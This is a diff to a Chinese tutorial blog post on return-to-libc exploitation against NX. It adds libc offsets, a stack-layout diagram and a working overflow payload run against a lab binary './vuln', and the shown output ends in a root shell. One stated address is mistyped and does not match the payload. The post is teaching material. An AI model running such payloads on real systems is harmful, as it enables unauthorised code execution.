@@ -5,6 +5,7 @@ excerpt: "sploitfun系列教程之2.1 return-to-libc"
 categories: [sploitfun系列教程]
 comments: true
 ---
+
 #### 什么是NX防护
 NX:No Execute,这个防护开启就意味着变量、栈、堆中数据没有执行权限而且代码空间没有写入的权限
 
@@ -67,8 +68,10 @@ f7ffc000-f7ffd000 r--p 00021000 fd:00 34036408                           /usr/li
 f7ffd000-f7ffe000 rw-p 00022000 fd:00 34036408                           /usr/lib/ld-2.17.so
 fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
 ```
+得到libc基地址位`f7e02000`
+
 通过`readelf -s /usr/lib/libc-2.17.so | grep system`查看system的offset
-```
+```shell
    246: 00132650    73 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
    627: 0003ef70    98 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
   1454: 0003ef70    98 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
@@ -85,7 +88,30 @@ fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
  0e5c8 745f6669 6e697368 005f494f 5f646566  t_finish._IO_def
  0e5d8 61756c74 5f787370 75746e00 5f5f7763  ault_xsputn.__wc
 ```
-sh.位置为0e5ce
+得到sh.位置offset为0e5ce,固sh.位置的绝对位置为`0xf7Ee05ce`
+
+我们需要在栈空间进行如下构建
+```
+ ______
+| AAAA |
+|------|
+| .... |
+|------|
+| AAAA |
+|------|
+|SYSTEM|
+|------|
+| AAAA |
+|------|
+|  SH  |
+|______|
+```
 
 
-### 未完待续
+最后的结果
+```bash
+./vuln `python -c 'print "A"*268 + "\x70\x0f\xe4\xf7"+"\xff\xff\xff\xff"+"\xce\x05\xe1\xf7"'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp澉????吾
+sh-4.2# exit
+exit
+```
